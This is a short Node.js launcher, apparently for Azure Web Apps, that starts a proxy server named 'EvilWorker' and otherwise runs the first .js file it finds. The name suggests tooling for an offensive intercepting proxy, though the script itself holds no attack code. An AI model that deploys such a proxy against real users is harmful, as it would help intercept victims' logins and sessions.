const { spawn } = require('child_process');
const path = require('path');

console.log('🚀 EvilWorker Azure Web App Startup');
console.log('📁 Current directory:', process.cwd());
console.log('📋 Files in directory:', require('fs').readdirSync('.'));

// Check if proxy_server.js exists
const proxyServerPath = path.join(process.cwd(), 'proxy_server.js');
if (require('fs').existsSync(proxyServerPath)) {
    console.log('✅ Found proxy_server.js, starting EvilWorker...');
    
    // Start EvilWorker proxy server
    const evilWorker = spawn('node', ['proxy_server.js'], {
        stdio: 'inherit',
        env: { ...process.env, PORT: process.env.PORT || 3000 }
    });
    
    evilWorker.on('error', (error) => {
        console.error('❌ Failed to start EvilWorker:', error);
    });
    
    evilWorker.on('exit', (code) => {
        console.log(`🔄 EvilWorker exited with code ${code}`);
    });
    
} else {
    console.error('❌ proxy_server.js not found!');
    console.log('📋 Available files:', require('fs').readdirSync('.'));
    
    // Fallback: try to start any .js file
    const jsFiles = require('fs').readdirSync('.').filter(f => f.endsWith('.js'));
    if (jsFiles.length > 0) {
        console.log('🔄 Trying to start:', jsFiles[0]);
        const fallback = spawn('node', [jsFiles[0]], { stdio: 'inherit' });
    }
}
